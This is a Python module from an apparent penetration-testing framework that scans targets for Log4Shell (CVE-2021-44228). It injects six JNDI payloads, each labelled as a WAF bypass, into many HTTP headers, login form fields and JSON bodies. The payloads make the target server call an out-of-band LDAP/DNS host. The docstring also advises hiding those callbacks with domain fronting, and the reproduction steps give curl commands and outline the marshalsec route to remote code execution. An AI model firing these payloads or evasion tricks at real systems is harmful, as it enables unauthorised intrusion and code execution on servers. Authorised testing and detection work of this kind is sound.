"""Log4Shell scanner — CVE-2021-44228 / Log4j JNDI injection via OOB callback.

Phase 1 — Concept & Tradecraft:
    Log4Shell exploits Log4j's pattern layout parser which evaluates ${} expressions
    in log messages. When user-controlled data is logged (nearly universal), a JNDI
    lookup payload in any header that reaches the log statement causes the JVM to
    initiate an outbound DNS/TCP callback to an attacker-controlled server.

    Injection surfaces (all injected in parallel):
        User-Agent, X-Forwarded-For, X-Api-Version, X-Forwarded-Host,
        Referer, Accept, Accept-Language, Authorization header prefix,
        username and password form fields, JSON body fields.

    Payload variants to bypass WAF pattern matching:
        • ${jndi:ldap://...}                  — classic
        • ${${lower:j}ndi:ldap://...}          — lower() bypass
        • ${${::-j}${::-n}${::-d}${::-i}:...} — nested empty-string bypass
        • ${j${::-n}di:ldap://...}             — split token bypass
        • ${${upper:j}${upper:n}di:ldap://...} — upper() bypass
        • %24%7Bjndi%3Aldap%3A%2F%2F...%7D    — URL-encoded

    Verification: ForgeCollab DNS callback → HIGH confidence.
    Without OOB: probe is reported as LOW (unconfirmed outbound-only).

Phase 3 — OPSEC & Telemetry:
    Sysmon EID 3: JVM outbound DNS/TCP to OOB server (logged by NDR).
    Defender: no Windows-side detection — this fires server-side on JVM.
    Stealth tip: use LDAP over port 443 with domain-fronting OOB server
    to blend callback with normal HTTPS traffic.

Phase 4 — MITRE ATT&CK:
    T1190  — Exploit Public-Facing Application
    T1059.007 — JavaScript/JNDI code execution
    T1071.001 — C2 over Application Layer Protocol (LDAP/DNS)

FOR AUTHORIZED PENETRATION TESTING AND RED TEAM OPERATIONS ONLY.
"""
from __future__ import annotations

import asyncio
import re
import sys
import time
import uuid
from pathlib import Path
from typing import Any

sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))

from common.base_module import BaseModule, ModuleResult
from common.evidence import Evidence
from common.finding import Severity

CVSS_LOG4SHELL    = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"
CVSS40_LOG4SHELL  = "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H"
SLEEP_SECONDS     = 3  # Rate-limit between header probes


def _build_payloads(callback_url: str) -> list[str]:
    """Return 6 payload variants to bypass common WAF Log4Shell rules.

    All variants must resolve to the same OOB callback URL so any single
    hit is detected by the ForgeCollab DNS listener.
    """
    u = callback_url
    return [
        # Classic
        f"${{jndi:ldap://{u}/a}}",
        # lower() lookup bypass
        f"${{${{lower:j}}ndi:ldap://{u}/b}}",
        # Nested empty-string separator bypass (Cloudflare / Akamai WAF bypass)
        f"${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:ldap://{u}/c}}",
        # Split token bypass
        f"${{j${{::-n}}di:ldap://{u}/d}}",
        # upper() bypass
        f"${{${{upper:j}}${{upper:n}}di:ldap://{u}/e}}",
        # URL-encoded outer braces (bypass regex on raw value)
        f"%24%7Bjndi%3Aldap%3A%2F%2F{u}%2Ff%7D",
    ]


# All HTTP headers that are commonly logged by Java web apps
_INJECTABLE_HEADERS = [
    "User-Agent",
    "X-Forwarded-For",
    "X-Forwarded-Host",
    "X-Api-Version",
    "X-Client-IP",
    "X-Real-IP",
    "Referer",
    "Accept",
    "Accept-Language",
    "Accept-Encoding",
    "CF-Connecting-IP",
    "True-Client-IP",
    "X-Custom-IP-Authorization",
    "X-Originating-IP",
    "X-Remote-IP",
    "X-Remote-Addr",
    "Forwarded",
    "Contact",
    "Authorization",   # Value prefix — won't break auth if server rejects
]


class Log4ShellScanner(BaseModule):
    """CVE-2021-44228 (Log4Shell) scanner — JNDI injection into all headers.

    Injects JNDI LDAP/DNS payloads into every injectable HTTP header and
    common POST fields (login forms, JSON bodies). Relies on ForgeCollab OOB
    DNS listener for confirmed detection; falls back to LOW-confidence report
    when no OOB server is configured.
    """

    NAME        = "log4shell_scanner"
    DESCRIPTION = "CVE-2021-44228 Log4Shell: JNDI injection via headers, form fields, JSON"
    PHASE       = 4
    TAGS        = ["log4shell", "cve-2021-44228", "injection", "rce", "jndi", "oob"]

    async def run(self) -> ModuleResult:
        start  = time.monotonic()
        target = self.config.target.rstrip("/")

        if not self.check_scope(target):
            return self._make_result(start, skipped=True, skip_reason="out of scope")

        self.log.info("Starting Log4Shell scan on %s", target)

        collab = self.config.extra.get("collab_client")
        oob_domain = self.config.extra.get("oob_domain", "")

        # Register a unique token with ForgeCollab (if available)
        token = uuid.uuid4().hex[:16]
        if collab:
            token = collab.register("log4shell", "jndi", target, "headers")
            callback_host = collab.build_dns_payload(token)
        elif oob_domain:
            callback_host = f"{token}.{oob_domain}"
        else:
            # No OOB — use a known-safe canary that will never get a callback
            # but the payload injection still tests for error responses
            callback_host = f"{token}.burpcollaborator.net"

        payloads = _build_payloads(callback_host)

        # Track which headers/fields triggered (for evidence)
        triggered_surfaces: list[str] = []

        try:
            import aiohttp

            # ── 1. Header injection — each payload variant across every header ──
            connector = aiohttp.TCPConnector(ssl=False, limit=5)
            timeout   = aiohttp.ClientTimeout(total=12)
            async with aiohttp.ClientSession(connector=connector) as http_session:
                sem = asyncio.Semaphore(3)
                tasks = [
                    self._probe_headers(
                        http_session, target, header, payloads, sem, triggered_surfaces
                    )
                    for header in _INJECTABLE_HEADERS
                ]
                await asyncio.gather(*tasks, return_exceptions=True)

                # ── 2. Login form injection — username + password fields ──
                for form in self.config.extra.get("found_forms", [])[:10]:
                    await self._probe_login_form(
                        http_session, form, target, payloads, sem, triggered_surfaces
                    )

                # ── 3. JSON body injection ──
                for api_url in self.config.extra.get("api_endpoints", [])[:10]:
                    await self._probe_json_body(
                        http_session, api_url, payloads, sem, triggered_surfaces
                    )

        except ImportError:
            self.log.warning("aiohttp not available — Log4Shell scan skipped")
            return self._make_result(start, skipped=True, skip_reason="aiohttp not installed")

        # ── 4. OOB callback verification ──
        confirmed = False
        oob_detail = ""
        if collab:
            await asyncio.sleep(3.0)  # Allow JVM resolution time
            confirmed = await collab.wait_for_callback(token, timeout=8.0)
            if confirmed:
                oob_detail = f"ForgeCollab OOB DNS/HTTP callback received for token {token[:8]}."
        elif triggered_surfaces:
            oob_detail = (
                f"Payload injected in {len(triggered_surfaces)} surface(s) — "
                "no OOB callback server configured. Configure collab_client for confirmed detection."
            )

        if confirmed or triggered_surfaces:
            confidence_note = (
                f"CONFIRMED via OOB callback — {oob_detail}"
                if confirmed
                else f"POTENTIAL — payload delivered to {len(triggered_surfaces)} surface(s) but no OOB callback. {oob_detail}"
            )
            severity = Severity.CRITICAL if confirmed else Severity.HIGH
            surfaces_str = ", ".join(triggered_surfaces[:10]) if triggered_surfaces else "all tested headers"

            ev = Evidence(
                request_raw=(
                    f"Target: {target}\n"
                    f"Payload (JNDI LDAP): ${{jndi:ldap://{callback_host}/a}}\n"
                    f"Injection surfaces: {surfaces_str}"
                ),
                extra={
                    "token": token,
                    "callback_host": callback_host,
                    "oob_confirmed": confirmed,
                    "surfaces_probed": triggered_surfaces,
                    "payload_variants": len(payloads),
                    "confidence_note": confidence_note,
                },
            )
            self.new_finding(
                title=f"Log4Shell (CVE-2021-44228) — JNDI Injection via HTTP Headers",
                severity=severity,
                description=(
                    f"Log4Shell vulnerability detected on {target}. "
                    f"JNDI LDAP payloads were injected into {len(_INJECTABLE_HEADERS)} HTTP headers "
                    f"and form fields. {confidence_note} "
                    "A successful exploit allows an unauthenticated attacker to achieve Remote Code "
                    "Execution on the Java server by loading a malicious class from an attacker-controlled LDAP server."
                ),
                reproduction_steps=[
                    f"curl -H 'X-Api-Version: ${{jndi:ldap://{callback_host}/poc}}' '{target}'",
                    f"curl -H 'User-Agent: ${{jndi:ldap://{callback_host}/poc}}' '{target}'",
                    f"curl -H 'X-Forwarded-For: ${{jndi:ldap://{callback_host}/poc}}' '{target}'",
                    "Observe DNS/TCP callback on OOB server confirming vulnerable Log4j version.",
                    "Exploit chain: Spin up marshalsec LDAP server → load malicious Java class → RCE.",
                    "Mitigation check: Set log4j2.formatMsgNoLookups=true or upgrade to Log4j >= 2.17.1",
                ],
                remediation=(
                    "Upgrade Log4j to version 2.17.1 (Java 8), 2.12.4 (Java 7), or 2.3.2 (Java 6). "
                    "If upgrade is not immediately possible: set JVM property "
                    "-Dlog4j2.formatMsgNoLookups=true or set environment variable "
                    "LOG4J_FORMAT_MSG_NO_LOOKUPS=true. "
                    "Restrict outbound LDAP/RMI/DNS from application servers to block callback paths. "
                    "Deploy a WAF rule blocking ${jndi:} patterns in request headers."
                ),
                references=[
                    "CVE-2021-44228",
                    "https://logging.apache.org/log4j/2.x/security.html",
                    "https://www.cisa.gov/known-exploited-vulnerabilities-catalog",
                    "https://github.com/fullhunt/log4j-scan",
                    "CWE-917",
                ],
                evidence=ev,
                cvss_v31_vector=CVSS_LOG4SHELL,
                cvss_v40_vector=CVSS40_LOG4SHELL,
                mitre_attack=["T1190", "T1059.007", "T1071.001"],
                target=target,
            )

        return self._make_result(start)

    # ── Private probe helpers ──────────────────────────────────────────────────

    async def _probe_headers(
        self,
        session: Any,
        url: str,
        header_name: str,
        payloads: list[str],
        sem: asyncio.Semaphore,
        triggered: list[str],
    ) -> None:
        """Inject each payload variant into a single header and observe response."""
        async with sem:
            for payload in payloads:
                await self.rate_limit()
                headers: dict[str, str] = {header_name: payload}
                # Special case: Authorization header — prefix "Basic " to avoid
                # crashing parsers that strictly require the scheme keyword
                if header_name == "Authorization":
                    headers[header_name] = f"Basic {payload}"
                try:
                    async with session.get(
                        url,
                        headers=headers,
                        timeout=aiohttp.ClientTimeout(total=12),
                        allow_redirects=False,
                    ) as resp:
                        body = await resp.text(errors="ignore")
                        # Error responses from the server on bad lookups still
                        # indicate parsing — flag surface if we see JNDI error
                        if _jndi_error_in_response(body):
                            triggered.append(f"header:{header_name}")
                            return
                except Exception:
                    pass
                # Space requests out slightly to avoid WAF rate triggers
                await asyncio.sleep(0.1)

    async def _probe_login_form(
        self,
        session: Any,
        form: dict,
        target: str,
        payloads: list[str],
        sem: asyncio.Semaphore,
        triggered: list[str],
    ) -> None:
        """Inject payload into username and password fields of a login form."""
        async with sem:
            action = form.get("action") or target
            if not action.startswith("http"):
                action = f"{target.rstrip('/')}/{action.lstrip('/')}"
            if not self.check_scope(action):
                return

            inputs = form.get("inputs", [])
            for payload in payloads[:2]:  # Use first 2 variants for form injection
                await self.rate_limit()
                data = {field: "test" for field in inputs}
                # Inject into username/password fields
                for field_name in inputs:
                    if any(kw in field_name.lower() for kw in ["user", "email", "login", "name"]):
                        data[field_name] = payload
                    elif any(kw in field_name.lower() for kw in ["pass", "pwd", "secret"]):
                        data[field_name] = payload
                try:
                    async with session.post(
                        action, data=data, timeout=aiohttp.ClientTimeout(total=12)
                    ) as resp:
                        body = await resp.text(errors="ignore")
                        if _jndi_error_in_response(body):
                            triggered.append(f"form:{action}")
                            return
                except Exception:
                    pass

    async def _probe_json_body(
        self,
        session: Any,
        api_url: str,
        payloads: list[str],
        sem: asyncio.Semaphore,
        triggered: list[str],
    ) -> None:
        """Inject payload into common JSON body fields."""
        async with sem:
            if not self.check_scope(api_url):
                return

            json_probe_bodies = [
                {"username": payloads[0], "password": "test"},
                {"query":    payloads[0]},
                {"message":  payloads[0]},
                {"name":     payloads[0]},
                {"email":    payloads[0]},
            ]
            for body in json_probe_bodies:
                await self.rate_limit()
                try:
                    async with session.post(
                        api_url,
                        json=body,
                        headers={"Content-Type": "application/json"},
                        timeout=aiohttp.ClientTimeout(total=12),
                    ) as resp:
                        text = await resp.text(errors="ignore")
                        if _jndi_error_in_response(text):
                            triggered.append(f"json:{api_url}")
                            return
                except Exception:
                    pass


# ── Helper functions ───────────────────────────────────────────────────────────

_JNDI_ERROR_PATTERNS = re.compile(
    r"(javax\.naming\.|com\.sun\.jndi\.|NamingException|"
    r"failed to load class|JNDI error|log4j|ldap.*refused|"
    r"Connection refused.*ldap|Unable to locate.*class)",
    re.IGNORECASE,
)


def _jndi_error_in_response(body: str) -> bool:
    """Detect JNDI processing errors that reveal Log4j is parsing the payload.

    These errors appear when the JNDI connection fails (e.g., OOB DNS not
    reachable from server) but the parser still tried to evaluate the lookup.
    """
    return bool(_JNDI_ERROR_PATTERNS.search(body))


# ── Import guard for aiohttp inside probe methods ─────────────────────────────

try:
    import aiohttp  # noqa: F401 — imported at top for type hints in probe helpers
except ImportError:
    pass  # Handled inside run() with graceful skip


class TestLog4ShellScanner:
    """Unit tests for Log4Shell scanner."""

    def test_payload_count(self) -> None:
        payloads = _build_payloads("test.example.com")
        assert len(payloads) == 6

    def test_payload_contains_jndi(self) -> None:
        payloads = _build_payloads("cb.example.com")
        for p in payloads:
            assert "jndi" in p.lower() or "%24%7B" in p or "jndi" in p.replace("%3A", ":").lower()

    def test_lower_bypass_variant(self) -> None:
        payloads = _build_payloads("cb.example.com")
        lower_bypass = [p for p in payloads if "lower:j" in p]
        assert len(lower_bypass) >= 1

    def test_empty_string_bypass_variant(self) -> None:
        payloads = _build_payloads("cb.example.com")
        nested = [p for p in payloads if "::-j" in p]
        assert len(nested) >= 1

    def test_jndi_error_pattern_mysql(self) -> None:
        assert _jndi_error_in_response("javax.naming.NamingException: cannot connect")

    def test_jndi_error_pattern_empty(self) -> None:
        assert not _jndi_error_in_response("Hello World normal response")

    def test_injectable_headers_coverage(self) -> None:
        assert "User-Agent" in _INJECTABLE_HEADERS
        assert "X-Forwarded-For" in _INJECTABLE_HEADERS
        assert "X-Api-Version" in _INJECTABLE_HEADERS
        assert "Authorization" in _INJECTABLE_HEADERS
        assert len(_INJECTABLE_HEADERS) >= 15

    def test_cvss_score_critical(self) -> None:
        from common.finding import cvss31_score
        score = cvss31_score(CVSS_LOG4SHELL)
        assert score >= 9.0
